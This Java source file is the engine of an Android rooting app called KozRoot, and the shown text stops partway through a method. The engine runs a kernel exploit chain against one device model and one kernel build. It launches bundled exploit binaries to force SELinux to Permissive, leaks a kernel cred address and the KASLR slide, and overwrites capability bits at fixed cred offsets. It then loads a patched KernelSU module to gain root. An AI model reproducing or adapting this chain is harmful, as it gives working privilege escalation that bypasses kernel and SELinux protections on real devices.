package com.KozOnekey;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Root flow engine for KozRoot.
 *
 * <p>单一链路（64560 优化链路 / B′-2）：</p>
 * SELinux→Permissive → cred/slide leak → KASLR patch →
 * capsA（CAP_CHOWN|CAP_DAC_OVERRIDE，worker 在 fsuid=2000 下布局 /data/adb）→
 * capsB（追加 CAP_SYS_MODULE，worker finit_module + root_stage）。
 * 全程不需要 fsuid=0。
 */
public final class RootEngine {

    public static final int ST_IDLE = 0;
    public static final int ST_RUN = 1;
    public static final int ST_OK = 2;
    public static final int ST_FAIL = 3;

    public static final String WORK = "/data/local/tmp/koznroot";
    private static final long SELINUX_T = -549712325079L;
    /** 运行前后需要清掉的 /data/local/tmp 残留（不含工作目录本身） */
    private static final String TMP_CLEAN =
            "rm -rf /data/local/tmp/onekey /data/local/tmp/exploit_direct /data/local/tmp/root_worker2 "
            + "/data/local/tmp/ksu_grant /data/local/tmp/su_forward /data/local/tmp/pmx_su "
            + "/data/local/tmp/root_stage.sh /data/local/tmp/ksu-base.ko /data/local/tmp/ksu-op3.ko "
            + "/data/local/tmp/ksud342 /data/local/tmp/manager.apk /data/local/tmp/.pmx110_payload "
            + "/data/local/tmp/.pmx110_route /data/local/tmp/onekey_dir /data/local/tmp/rkw_stop "
            + "/data/local/tmp/rkw_done /data/local/tmp/rkw_cmd /data/local/tmp/rkw_cmd.run "
            + "/data/local/tmp/rkw_cmd_done /data/local/tmp/rkw_cmd_out /data/local/tmp/rkw*.out "
            + "/data/local/tmp/perm.out /data/local/tmp/caps.out /data/local/tmp/fsuid.out "
            + "/data/local/tmp/su_test.out /data/local/tmp/root_stage_out.txt /data/local/tmp/root_stage.ok "
            + "/data/local/tmp/root_id.txt /data/local/tmp/dmesg_*.txt /data/local/tmp/pstore_*.txt "
            + "2>/dev/null";
    /** 与具体管理器无关的固定 payload */
    private static final String[][] BASE_ASSET_HASHES = new String[][]{
            {"exploit_direct", "2fef478b98553364aea722e61e3a96d0ec302838d63b7f1fd7c9133fe28a69e0"},
            {"root_worker2", "d57e6a2c185fb6c73aebf9bb6970127412a1d7003f53917cacfe30a8552969cd"}};
    /** 当前运行使用的管理器（默认 KernelSU-Next，由 RootState 在 start 时指定） */
    private volatile RootManager manager = RootManager.KERNELSU_NEXT;
    /** 当前运行使用的漏洞链路（固定为 64560 优化链路） */
    private final RootChain chain = RootChain.CVE_64560_NEW;
    /** 本次运行实际选择/安装的管理器包名 */
    private volatile String managerPkg = RootManager.KERNELSU_NEXT.bearerPackage;

    public interface Listener {
        void onLog(String line);
        void onStage(int idx, int state, String extra);
        void onStagesReset();
        void onStatus(int state, String text);
        void onState(boolean running);
        void onFinished(boolean ok, String log, long seconds);
        /** 检测到内核残留：UI 需弹出玻璃弹窗让用户选择继续/取消/重启。 */
        void onResidueWarning(int timerActive, int exploitCount);
    }

    private final Context ctx;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private final Listener listener;
    private final StringBuilder logBuf = new StringBuilder();
    private final int[] stageState = new int[8];
    private volatile boolean running = false;
    private long runStartedAt = 0L;

    /* ---- 内核残留提示：引擎挂起等待 UI 的弹窗选择 ---- */
    public static final int RESIDUE_PENDING = 0;
    public static final int RESIDUE_CONTINUE = 1;
    public static final int RESIDUE_CANCEL = 2;
    public static final int RESIDUE_REBOOT = 3;
    private final Object residueLock = new Object();
    private volatile int residueDecision = RESIDUE_PENDING;

    /** 由 UI 弹窗按钮调用：1=继续执行 2=取消执行 3=重启手机。 */
    public void decideResidue(int decision) {
        synchronized (this.residueLock) {
            this.residueDecision = decision;
            this.residueLock.notifyAll();
        }
    }

    public RootEngine(Context context, Listener listener) {
        this.ctx = context.getApplicationContext();
        this.listener = listener;
    }

    public boolean isRunning() {
        return this.running;
    }

    public String getLog() {
        return this.logBuf.toString();
    }

    public RootManager getManager() {
        return this.manager;
    }

    public RootChain getChain() {
        return this.chain;
    }

    public String getManagerPkg() {
        return this.managerPkg;
    }

    public boolean start() {
        return this.start(RootManager.KERNELSU_NEXT);
    }

    public boolean start(RootManager mgr) {
        if (this.running) {
            return false;
        }
        this.manager = mgr == null ? RootManager.KERNELSU_NEXT : mgr;
        this.managerPkg = this.manager.bearerPackage;
        this.running = true;
        this.runStartedAt = System.currentTimeMillis();
        this.logBuf.setLength(0);
        this.ui.post(() -> this.listener.onState(true));
        new Thread(this::runFlow, "root-flow").start();
        return true;
    }

    private void log(String string) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        final String line = "[" + time + "] " + string + "\n";
        this.ui.post(() -> {
            this.logBuf.append(line);
            this.listener.onLog(line);
        });
    }

    private void setStatus(int n, String string) {
        this.ui.post(() -> this.listener.onStatus(n, string));
    }

    private void setStage(int idx, int state, String extra) {
        this.stageState[idx] = state;
        final String shown = extra;
        this.ui.post(() -> this.listener.onStage(idx, state, shown));
    }

    private void resetStages() {
        for (int i = 0; i < this.chain.stageCount(); ++i) {
            this.stageState[i] = 0;
        }
        for (int i = this.chain.stageCount(); i < this.stageState.length; ++i) {
            this.stageState[i] = 0;
        }
        this.ui.post(this.listener::onStagesReset);
        this.setStatus(ST_IDLE, "就绪");
    }

    /** 开始第 idx 阶段（0-based），自动带上链路动态的阶段编号/名称日志。 */
    private void beginStage(int idx, String title) {
        this.log("---- [" + (idx + 1) + "/" + this.chain.stageCount() + "] " + title + " ----");
        this.setStage(idx, 1, null);
    }

    private void endStage(int idx) {
        this.setStage(idx, 2, null);
    }

    private void endStage(int idx, String extra) {
        this.setStage(idx, 2, extra);
    }

    private void failStage(int idx) {
        this.setStage(idx, 3, null);
    }

    private void finishRun(boolean ok) {
        long seconds = Math.max(0L, (System.currentTimeMillis() - this.runStartedAt) / 1000L);
        final String log = this.logBuf.toString();
        this.running = false;
        this.ui.post(() -> {
            this.listener.onFinished(ok, log, seconds);
            this.listener.onState(false);
        });
    }

    private void runFlow() {
        this.resetStages();
        this.workerChildPid = 0;
        boolean ok = false;
        PowerManager pm = (PowerManager) this.ctx.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = null;
        try {
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "kozroot:root-flow");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(2700000L);
            }
            ok = this.doFlow();
        } catch (Throwable t) {
            this.log("异常: " + String.valueOf(t));
        } finally {
            if (Shell.ready()) {
                this.cleanupResidual(ok);
            } else {
                this.log("Stellar 未连接，跳过清理");
            }
            try {
                if (wakeLock != null && wakeLock.isHeld()) {
                    wakeLock.release();
                }
            } catch (Throwable ignored) {
            }
            this.finishRun(ok);
        }
    }

    private void cleanupResidual(boolean ok) {
        this.log("---- 清理残留进程 ----");
        Shell.exec("touch " + WORK + "/rkw_stop 2>/dev/null");
        sleepMs(1200L);
        Shell.exec("pkill -9 root_worker2 2>/dev/null; pkill -9 RKW 2>/dev/null");
        this.freezeExploits();
        sleepMs(500L);
        Shell.exec("su -c 'pkill -9 -f root_worker2; kill -STOP $(pidof exploit_direct) 2>/dev/null; pkill -9 -x RKW' 2>/dev/null");
        sleepMs(500L);
        String left = Shell.exec("ps -A -o NAME 2>/dev/null | grep -cE 'RKW|root_worker2|exploit_direct'").trim();
        this.log("清理完成（剩余进程: " + (left == null || left.isEmpty() ? "0" : left) + "）");
        if (ok) {
            // 关闭所有已安装管理器的旧实例，避免用户看到“未激活”；
            // 不自动拉起管理器，提权成功后由用户点绿色按钮自己打开。
            java.util.LinkedHashSet<String> kill = new java.util.LinkedHashSet<>();
            if (this.managerPkg != null) kill.add(this.managerPkg);
            for (String p : RootManager.installedPackages(this.ctx)) kill.add(p);
            String[] pkgs = kill.toArray(new String[0]);
            this.log("关闭管理器旧实例: " + String.join(", ", pkgs));
            for (String p : pkgs) {
                Shell.exec("am force-stop " + p + " 2>/dev/null");
            }
            sleepMs(400L);
            for (String p : pkgs) {
                Shell.exec("pkill -f " + p + " 2>/dev/null");
            }
        }
        // 收尾诊断保留进 App 运行记录，然后删掉工作目录/临时文件，下次运行重新复制
        String stageLog = Shell.exec("tail -80 " + WORK + "/root_stage.log 2>/dev/null");
        if (stageLog != null && !stageLog.trim().isEmpty()
                && !stageLog.contains("No such file") && !stageLog.contains("can't open")) {
            this.log("---- root_stage 摘要 ----");
            for (String line : stageLog.split("\n")) {
                if (!line.trim().isEmpty()) this.log("| " + line.trim());
            }
            this.log("---- root_stage 摘要结束 ----");
        }
        this.log("删除 tmp 工作目录与临时文件（下次运行重新复制）");
        Shell.exec("rm -rf " + WORK + " 2>/dev/null; " + TMP_CLEAN);
    }

    private boolean doFlow() {
        this.setStatus(ST_RUN, "检查运行环境 ...");
        this.log("检查 Stellar 连接 ...");
        if (!Shell.ready()) {
            this.log("✗ Stellar 未连接：请先打开 Stellar，用「无线调试 / Root 启动」把服务启动起来，并在其中授权 KozRoot。");
            this.log("  提示：启动 Stellar 服务后再回到本应用，状态会自动刷新。");
            this.setStatus(ST_FAIL, "Stellar 未连接");
            return false;
        }
        if (!Shell.waitReady(5000L)) {
            this.log("✗ Stellar 连接超时，请检查 Stellar 服务状态。");
            this.setStatus(ST_FAIL, "Stellar 连接超时");
            return false;
        }
        String id = Shell.exec("id 2>&1").trim();
        this.log("Stellar: " + id);
        if (id.contains("EXEC_ERROR") || id.contains("requires permission")) {
            this.log("✗ Stellar 服务未运行（或未授权），无法获得 shell 权限。");
            this.log("   解决步骤：");
            this.log("   1) 打开 Stellar（点上方状态条可直接进入）");
            this.log("   2) 用「Root 启动」或「无线调试」把服务启动起来");
            this.log("   3) 在「授权应用」里给 KozRoot 授权");
            this.log("   4) 回到本应用重试");
            this.setStatus(ST_FAIL, "Stellar 服务未运行");
            return false;
        }
        String model = Shell.exec("getprop ro.product.model").trim();
        String kernel = Shell.exec("uname -r").trim();
        String fingerprint = Shell.exec("getprop ro.build.fingerprint").trim();
        this.log("model=" + model + "  kernel=" + kernel);
        this.log("fingerprint=" + fingerprint);
        if (model.contains("EXEC_ERROR") || kernel.contains("EXEC_ERROR")) {
            this.log("✗ 无法读取设备信息（Stellar 权限异常），请先在 Stellar 中授权后重试。");
            this.setStatus(ST_FAIL, "Stellar 权限异常");
            return false;
        }
        String expectedKernel = "6.18.21-android17-5-gf957accaf563-ab15926176-4k";
        if (!model.contains("PMX110")) {
            this.log("✗ 不支持的设备：model=" + model + "，已停止");
            this.setStatus(ST_FAIL, "不支持的设备");
            return false;
        }
        if (!expectedKernel.equals(kernel)) {
            this.log("✗ 不支持的内核：" + kernel + "，已停止");
            this.log("  仅支持：" + expectedKernel);
            this.setStatus(ST_FAIL, "不支持的内核");
            return false;
        }
        this.log("管理器: " + this.manager.displayName);
        this.log("---- 内核残留状态 ----");
        if (!this.checkResidueAndAsk()) {
            this.log("本次执行已停止");
            return false;
        }
        this.log("---- 清理上次残留（进程 + tmp 文件） ----");
        this.preClean();
        this.log("---- 校验 payload ----");
        if (!this.verifyAssets()) {
            this.log("✗ payload 校验失败（文件被修改或版本不匹配），已停止");
            this.setStatus(ST_FAIL, "校验失败");
            return false;
        }
        this.log("payload 校验通过");
        this.log("---- 复制 payload ----");
        if (!this.copyAssets()) {
            this.setStatus(ST_FAIL, "payload 失败");
            return false;
        }
        long flowStart = System.currentTimeMillis();
        long tStage = System.currentTimeMillis();
        this.log("链路: " + this.chain.displayName + "（" + this.chain.stageCount() + " 阶段）");

        this.beginStage(0, this.chain.stageNames[0]);
        if (!this.stagePerm()) {
            this.failStage(0);
            return false;
        }
        this.endStage(0);
        this.log("perm 用时 " + (System.currentTimeMillis() - tStage) / 1000L + " 秒");
        tStage = System.currentTimeMillis();
        this.log("Permissive OK");

        this.beginStage(1, this.chain.stageNames[1]);
        String[] leak = this.stageLeak();
        if (leak == null) {
            this.failStage(1);
            return false;
        }
        String cred = leak[0];
        long slide = Long.parseUnsignedLong(leak[1].replace("0x", ""), 16);
        int worker = Integer.parseInt(leak[2]);
        this.endStage(1, "worker#" + worker);
        this.log("leak 用时 " + (System.currentTimeMillis() - tStage) / 1000L + " 秒");
        tStage = System.currentTimeMillis();
        this.log("cred=" + cred + "  slide=0x" + Long.toHexString(slide) + "  worker#" + worker);

        this.beginStage(2, this.chain.stageNames[2]);
        String patch = this.stagePatch(cred, slide);
        this.log("patch: " + patch);
        if (patch.startsWith("bad") || patch.startsWith("no") || patch.startsWith("ERR")) {
            this.failStage(2);
            return false;
        }
        this.endStage(2);
        this.log("patch 用时 " + (System.currentTimeMillis() - tStage) / 1000L + " 秒");
        tStage = System.currentTimeMillis();

        // 64560 优化链路（B′-2）：capsA 只给 CHOWN|DAC_OVERRIDE，worker 用 fsuid=2000 布局 /data/adb
        this.beginStage(3, this.chain.stageNames[3]);
        if (!this.stageCapsA(cred, worker)) {
            this.failStage(3);
            return false;
        }
        this.endStage(3);
        this.log("capsA 用时 " + (System.currentTimeMillis() - tStage) / 1000L + " 秒");
        tStage = System.currentTimeMillis();
        this.log("capsA OK（caps 已落地；worker 继续在后台完成 /data/adb 布局，capsB 并行开始）");

        // 最后阶段：capsB（追加 CAP_SYS_MODULE → worker 自行 finit_module + root_stage）
        int finalStage = this.chain.stageCount() - 1;
        this.beginStage(finalStage, this.chain.stageNames[finalStage]);
        if (!this.stageCapsB(cred, worker)) {
            this.failStage(finalStage);
            return false;
        }
        this.log("capsB OK（worker 已自行加载模块并执行 root_stage）");
        if (!this.waitModule()) {
            this.log("⚠ 未等到 modules Live（shell 通道可能已断），继续尝试收尾/验证");
        } else {
            this.log("KernelSU 模块 Live");
        }
        String grant = this.stageGrant();
        this.log("grant: " + grant);
        String su = Shell.exec("su -c id 2>&1").trim();
        this.log("su test: " + su);
        String stageOk = Shell.exec("cat " + WORK + "/root_stage.ok 2>/dev/null").trim();
        boolean ok = su.contains("uid=0(root)");
        if (!ok && stageOk.contains("ROOT_STAGE_OK")) {
            this.log("⚠ su 验证通道异常，但 root_stage 已完成（含 LAYOUT_OK），root 很可能已可用");
            ok = true;
        }
        if (ok) {
            this.endStage(finalStage);
            this.log("su 已由内核钩子接管（磁盘上没有 su 文件）");
            this.log("需要 root 的软件请在 " + this.manager.displayName + " 管理器里授权（App Profile → 超级用户）");
            this.log("模块+收尾 用时 " + (System.currentTimeMillis() - tStage) / 1000L + " 秒");
            this.log("总用时 " + (System.currentTimeMillis() - flowStart) / 1000L + " 秒");
            this.log("======== ROOT OK (临时 root，重启失效) ========");
            return true;
        }
        this.failStage(finalStage);
        this.log("✗ 无法确认 su：最后阶段 shell 通道（Stellar）断开，root 结果未知");
        this.log("  请打开 " + this.manager.displayName + " 管理器确认是否已连接：");
        this.log("  · 管理器已连接、MT 能获取 root → 说明 root 实际已成功，可忽略本次报错");
        this.log("  · 否则重启手机后重试，或在 Stellar 里重新启动服务");
        return false;
    }

    private boolean verifyAssets() {
        try {
            for (String[] pair : BASE_ASSET_HASHES) {
                if (!this.verifyAsset(pair[0], pair[1])) return false;
            }
            for (String[] pair : this.manager.assetHashes()) {
                if (!this.verifyAsset(pair[0], pair[1])) return false;
            }
            return true;
        } catch (Throwable t) {
            this.log("✗ 校验异常: " + t);
            return false;
        }
    }

    private boolean verifyAsset(String name, String expected) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
            try (InputStream in = this.ctx.getAssets().open(name)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) {
                    md.update(buf, 0, n);
                }
            }
            StringBuilder sb = new StringBuilder();
            for (byte b : md.digest()) {
                sb.append(String.format("%02x", b & 0xff));
            }
            if (!sb.toString().equals(expected)) {
                this.log("✗ " + name + " 哈希不匹配");
                return false;
            }
            return true;
        } catch (Throwable t) {
            this.log("✗ 校验 " + name + " 异常: " + t);
            return false;
        }
    }

    /** 每次运行开始前清理上一次留下的进程与 tmp 文件 */
    private void preClean() {
        Shell.exec("touch " + WORK + "/rkw_stop 2>/dev/null");
        sleepMs(600L);
        Shell.exec("pkill -9 root_worker2 2>/dev/null; pkill -9 RKW 2>/dev/null");
        sleepMs(300L);
        this.freezeExploits();
        Shell.exec("pkill -9 -f root_worker2 2>/dev/null");
        Shell.exec("rm -rf " + WORK + " 2>/dev/null; " + TMP_CLEAN);
        this.log("上次残留已清理（进程 + tmp 文件）");
    }

    private boolean copyAssets() {
        Shell.exec("rm -rf " + WORK + "; mkdir -p " + WORK);
        Shell.exec("rm -rf /data/local/tmp/onekey /data/local/tmp/exploit_direct /data/local/tmp/root_worker2 /data/local/tmp/ksu_grant /data/local/tmp/su_forward /data/local/tmp/pmx_su /data/local/tmp/root_stage.sh /data/local/tmp/ksu-base.ko /data/local/tmp/ksu-op3.ko /data/local/tmp/ksud342 /data/local/tmp/manager.apk /data/local/tmp/.pmx110_payload /data/local/tmp/.pmx110_route /data/local/tmp/onekey_dir /data/local/tmp/rkw_stop /data/local/tmp/rkw_done /data/local/tmp/rkw_cmd /data/local/tmp/rkw_cmd.run /data/local/tmp/rkw_cmd_done /data/local/tmp/rkw_cmd_out /data/local/tmp/rkw*.out /data/local/tmp/perm.out /data/local/tmp/caps.out /data/local/tmp/fsuid.out /data/local/tmp/su_test.out /data/local/tmp/root_stage_out.txt /data/local/tmp/root_stage.ok /data/local/tmp/root_id.txt /data/local/tmp/dmesg_*.txt /data/local/tmp/pstore_*.txt 2>/dev/null");
        // 两台公共 payload
        if (!this.copyAsset("exploit_direct", "exploit_direct")) return false;
        if (!this.copyAsset("root_worker2", "root_worker2")) return false;
        // 管理器组合：ko / ksud / 收尾脚本 / 管理器 APK /（可选）ksuinit
        if (!this.copyAsset(this.manager.koAsset, "ksu-base.ko")) return false;
        if (!this.copyAsset(this.manager.ksudAsset, "ksud342")) return false;
        if (!this.copyAsset(this.manager.stageAsset, "root_stage.sh")) return false;
        if (!this.copyAsset(this.manager.managerAsset, "manager.apk")) return false;
        if (this.manager.ksuinitAsset != null && !this.copyAsset(this.manager.ksuinitAsset, "ksuinit")) return false;
        for (String extra : this.manager.extraAssets) {
            if (!this.copyAsset(extra, extra)) return false;
        }
        StringBuilder extraChmod = new StringBuilder();
        for (String extra : this.manager.extraAssets) {
            extraChmod.append(" ").append(WORK).append("/").append(extra);
        }
        Shell.exec("chmod 755 " + WORK + "/exploit_direct " + WORK + "/root_worker2 " + WORK + "/root_stage.sh " + WORK + "/ksud342"
                + (this.manager.ksuinitAsset != null ? " " + WORK + "/ksuinit" : "")
                + "; chmod 644 " + WORK + "/ksu-base.ko " + WORK + "/manager.apk" + extraChmod);

        // 选择实际使用的管理器包：已安装优先，版本过旧则升级，没有则安装内置版本
        String pkg = null;
        for (String candidate : this.manager.packages) {
            if (Shell.exec("pm path " + candidate + " 2>/dev/null").trim().contains("package:")) {
                pkg = candidate;
                break;
            }
        }
        if (pkg != null) {
            int vc = 0;
            String vcLine = Shell.exec("dumpsys package " + pkg + " 2>/dev/null | grep versionCode | head -1").trim();
            Matcher m = Pattern.compile("versionCode=(\\d+)").matcher(vcLine);
            if (m.find()) vc = Integer.parseInt(m.group(1));
            if (vc > 0 && vc < this.manager.minVersionCode) {
                this.log("管理器 " + pkg + " 版本 " + vc + " 偏旧，升级到内置版本");
                pkg = null;
            }
        }
        if (pkg == null) {
            this.log("安装/升级 " + this.manager.displayName + " 管理器 ...");
            this.log(Shell.exec("pm install -r " + WORK + "/manager.apk 2>&1").trim());
            pkg = this.manager.bearerPackage;
        } else {
            this.log(this.manager.displayName + " 管理器已安装");
        }
        this.managerPkg = pkg;
        Shell.exec("echo " + pkg + " > " + WORK + "/manager_pkg.txt");
        this.log("管理器: " + this.manager.displayName + " (" + pkg + ")");
        this.log("payload 就绪（" + WORK + "）");
        return true;
    }

    private boolean copyAsset(String assetName, String destName) {
        boolean ok = false;
        for (int i = 1; i <= 3 && !ok; ++i) {
            try (InputStream in = this.ctx.getAssets().open(assetName)) {
                ok = Shell.writeFile(WORK + "/" + destName, in);
            } catch (Throwable t) {
                this.log("   异常: " + String.valueOf(t));
            }
            if (!ok) {
                this.log("   重试 " + i + "/3 ...");
                sleepMs(1500L);
            }
        }
        if (!ok) {
            this.log("✗ 写入 " + assetName + " 失败（shell 拒绝）");
        }
        return ok;
    }

    private boolean stagePerm() {
        String env = "PMX_RACE_BATCH=6 PMX_MAX_ATTEMPTS=96 PMX_TRIPLE_V=0 PMX_TRIPLE_T=0x" + Long.toHexString(SELINUX_T) + " PMX_COUNT_HITS=1 PMX_RCU_WAIT_US=2000000 PMX_PIPE_COUNT=3000 PMX_COOLDOWN_MS=400";
        for (int i = 1; i <= 15; ++i) {
            if ("Permissive".equals(Shell.exec("getenforce").trim())) {
                this.freezeExploits();
                return true;
            }
            this.log("perm 第 " + i + " 轮 ...");
            this.freezeExploits();
            Shell.exec("cd " + WORK + "; " + env + " nohup ./exploit_direct > perm.out 2>&1 </dev/null &");
            for (int j = 0; j < 200; ++j) {
                sleepMs(3000L);
                if ("Permissive".equals(Shell.exec("getenforce").trim())) {
                    // Stop the perm exploit immediately: otherwise it keeps running
                    // its MISC_BRIDGE stage concurrently with the leak workers and
                    // the capsA race (dirty-kernel-state / panic risk).
                    this.freezeExploits();
                    return true;
                }
                String cnt = Shell.exec("ps -A -o NAME | grep -c exploit_direct 2>/dev/null").trim();
                if ("0".equals(cnt)) break;
            }
            this.freezeExploits();
        }
        return false;
    }

    private String[] stageLeak() {
        Shell.exec("rm -f " + WORK + "/rkw_stop " + WORK + "/rkw_done 2>/dev/null; cd " + WORK + "; pkill -9 root_worker2 2>/dev/null; pkill -9 RKW 2>/dev/null; rm -f rkw*.out; sleep 1; for i in 1 2 3 4; do nohup ./root_worker2 > rkw$i.out 2>&1 </dev/null & done");
        sleepMs(10000L);
        Pattern pCred = Pattern.compile("CHILD_CRED=0x([0-9a-fA-F]+)");
        Pattern pCs = Pattern.compile("CRED_CS=0x([0-9a-fA-F]+)");
        Pattern pPid = Pattern.compile("CHILD_PID=(\\d+)");
        Pattern pUid = Pattern.compile("Uid:\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)");
        String cred = null;
        String slide = null;
        int worker = 0;
        int childPid = 0;
        for (int i = 1; i <= 4; ++i) {
            String out = Shell.exec("cat " + WORK + "/rkw" + i + ".out 2>/dev/null");
            if (out == null) continue;
            Matcher m1 = pCred.matcher(out);
            Matcher m2 = pCs.matcher(out);
            Matcher m3 = pPid.matcher(out);
            if (cred != null || !m1.find() || !m2.find() || !m3.find()) continue;
            int wpid = Integer.parseInt(m3.group(1));
            if (!Shell.exec("test -d /proc/" + wpid + " && echo ALIVE").trim().contains("ALIVE")) continue;
            // B'-2 requires fsuid=2000 for the layout worker; a changed fsuid means
            // the leaked cred/proc is not the process we expect -> fail early.
            String status = Shell.exec("grep ^Uid: /proc/" + wpid + "/status 2>/dev/null").trim();
            Matcher mu = pUid.matcher(status);
            if (!mu.find()) continue;
            int fsuid = Integer.parseInt(mu.group(4));
            if (fsuid != 2000) {
                this.log("✗ worker child(pid=" + wpid + ") fsuid=" + fsuid + "（B'-2 要求 2000），本轮中止");
                return null;
            }
            cred = m1.group(1);
            worker = i;
            childPid = wpid;
            long cs = Long.parseUnsignedLong(m2.group(1), 16);
            long known = Long.parseUnsignedLong("ffffffc08014f140", 16);
            slide = "0x" + Long.toHexString(cs - known);
        }
        if (cred == null || slide == null) {
            this.log("leak 输出: " + Shell.exec("cat " + WORK + "/rkw1.out 2>/dev/null | tail -8"));
            return null;
        }
        long slideVal = Long.parseUnsignedLong(slide.replace("0x", ""), 16);
        if (slideVal == 0 || slideVal > 0x10000000000L) {
            this.log("✗ slide 不合理: " + slide + "，本轮中止（可能是 leak 读数错误）");
            return null;
        }
        this.workerChildPid = childPid;
        String alive = Shell.exec("ps -A -o NAME 2>/dev/null | grep -cE 'RKW|root_worker2'").trim();
        this.log("leak 用 worker#" + worker + "，child pid=" + childPid + "，存活 RKW=" + alive);
        if ("0".equals(alive)) {
            this.log("✗ worker 已退出（检查 rkw_stop 残留）");
            return null;
        }
        return new String[]{"0x" + cred, slide, String.valueOf(worker)};
    }

    private String stagePatch(String cred, long slide) {
        try {
            File inFile = new File(WORK, "ksu-base.ko");
            File outFile = new File(this.ctx.getCacheDir(), "ksu-patched.ko");
            String res = PatchKo.patch(inFile, slide, outFile);
            this.log("  " + res);
            if (res.startsWith("bad")) return res;
            if (res.startsWith("no")) return res;
            try (FileInputStream fis = new FileInputStream(outFile)) {
                if (!Shell.writeFile(WORK + "/ksu-op3.ko", fis)) {
                    return "ERR write ksu-op3.ko failed (shell denied)";
                }
            }
            Shell.exec("chmod 644 " + WORK + "/ksu-op3.ko");
            return res;
        } catch (Throwable t) {
            return "ERR " + String.valueOf(t);
        }
    }

    /**
     * 64560 优化链路 capsA：T = cred + 0x40，V = 0x3
     * （CAP_CHOWN | CAP_DAC_OVERRIDE）。worker 收到后在 fsuid=2000 下布局 /data/adb，
     * 成功后打印 {@code LAYOUT_DONE_MARK}。
     */
    private boolean stageCapsA(String cred, int worker) {
        long addr = Long.parseUnsignedLong(cred.replace("0x", ""), 16);
        String target = "0x" + Long.toHexString(addr + 0x40L);
        String env = "PMX_KEY_ORDER1=20000 PMX_RACE_BATCH=6 PMX_MAX_ATTEMPTS=48 PMX_TRIPLE_V=0x3 PMX_TRIPLE_T=" + target
                + " PMX_COUNT_HITS=1 PMX_RCU_WAIT_US=2000000 PMX_PIPE_COUNT=3000 PMX_COOLDOWN_MS=250";
        String outFile = WORK + "/rkw" + worker + ".out";
        for (int i = 1; i <= 30; ++i) {
            if (!this.ensureWorker(worker)) {
                return false;
            }
            this.log("capsA 第 " + i + " 轮 ...");
            this.freezeExploits();
            Shell.exec("cd " + WORK + "; " + env
                    + " nohup ./exploit_direct > capsA.out 2>&1 </dev/null &");
            for (int j = 0; j < 180; ++j) {
                sleepMs(2000L);
                // CAPS_LAYOUT_SEEN appears the moment capsA lands (before the
                // layout finishes). Using it as the success signal lets capsB
                // start racing in parallel with the /data/adb layout; the worker
                // itself only loads the module after layout_done && full caps.
                String cnt = Shell.exec("grep -cE 'CAPS_LAYOUT_SEEN|LAYOUT_DONE_MARK' " + outFile + " 2>/dev/null").trim();
                if (cnt != null && !cnt.isEmpty() && !"0".equals(cnt)) {
                    this.log("capsA 落地（worker 已获得 CAP_CHOWN/DAC_OVERRIDE）");
                    this.freezeExploits();
                    return true;
                }
                String alive = Shell.exec("ps -A -o NAME | grep -c exploit_direct 2>/dev/null").trim();
                if ("0".equals(alive)) break;
            }
            this.freezeExploits();
        }
        return false;
    }

    /**
     * 64560 新链路 capsB：T = cred + 0x42，V = 0x1。
     * 只覆盖 cap_effective 的 bit16..63，保留 capsA 写好的 bit0|bit1，
     * 终值 = 0x10003（CHOWN | DAC_OVERRIDE | SYS_MODULE）。
     * worker 读到 CAPS_SEEN 后自行 finit_module，并通过 su 执行 root_stage。
     */
    private boolean stageCapsB(String cred, int worker) {
        long addr = Long.parseUnsignedLong(cred.replace("0x", ""), 16);
        String target = "0x" + Long.toHexString(addr + 0x42L);
        String env = "PMX_KEY_ORDER1=20000 PMX_RACE_BATCH=6 PMX_MAX_ATTEMPTS=48 PMX_TRIPLE_V=0x1 PMX_TRIPLE_T=" + target
                + " PMX_COUNT_HITS=1 PMX_RCU_WAIT_US=2000000 PMX_PIPE_COUNT=3000 PMX_COOLDOWN_MS=250";
        String outFile = WORK + "/rkw" + worker + ".out";
        for (int i = 1; i <= 30; ++i) {
            if (!this.ensureWorker(worker)) {
                return false;
            }
            this.log("capsB 第 " + i + " 轮 ...");
            this.freezeExploits();
            Shell.exec("cd " + WORK + "; " + env
                    + " nohup ./exploit_direct > capsB.out 2>&1 </dev/null &");
            for (int j = 0; j < 180; ++j) {
                sleepMs(2000L);
                String cnt = Shell.exec("grep -c CAPS_SEEN " + outFile + " 2>/dev/null").trim();
                if (cnt != null && !cnt.isEmpty() && !"0".equals(cnt)) {
                    this.freezeExploits();
                    return true;
                }
                String alive = Shell.exec("ps -A -o NAME | grep -c exploit_direct 2>/dev/null").trim();
                if ("0".equals(alive)) break;
            }
            this.freezeExploits();
        }
        return false;
    }

    private boolean ensureWorker(int worker) {
        if (this.workerChildPid > 0) {
            String alive = Shell.exec("test -d /proc/" + this.workerChildPid + " && echo ALIVE").trim();
            if ("ALIVE".equals(alive)) {
                return true;
            }
            this.log("✗ 目标 worker#" + worker + " 的 child(pid=" + this.workerChildPid
                    + ") 已退出 —— cred 地址可能失效，本轮中止，请重新点「开始提权」");
            return false;
        }
        String alive = Shell.exec("ps -A -o NAME 2>/dev/null | grep -cE 'RKW|root_worker2'").trim();
        if (alive != null && !alive.isEmpty() && !"0".equals(alive)) {
            return true;
        }
        this.log("✗ worker 已退出（cred 地址失效）——本轮中止，请重新点「开始提权」");
        return false;
    }

    private boolean waitModule() {
        long deadline = System.currentTimeMillis() + 90000L;
        while (System.currentTimeMillis() < deadline) {
            sleepMs(3000L);
            String out = Shell.exec("grep -i kernelsu /proc/modules 2>/dev/null");
            if (out != null && out.contains("kernelsu")) {
                return true;
            }
            if (Shell.isChannelError(out)) {
                Shell.recover(6000L);
            }
        }
        return false;
    }

    private String stageGrant() {
        Shell.exec("monkey -p " + this.managerPkg + " -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1");
        boolean stageDone = false;
        for (int i = 0; i < 30; ++i) {
            String ok = Shell.exec("cat " + WORK + "/root_stage.ok 2>/dev/null");
            if (ok != null && ok.contains("ROOT_STAGE_OK")) {
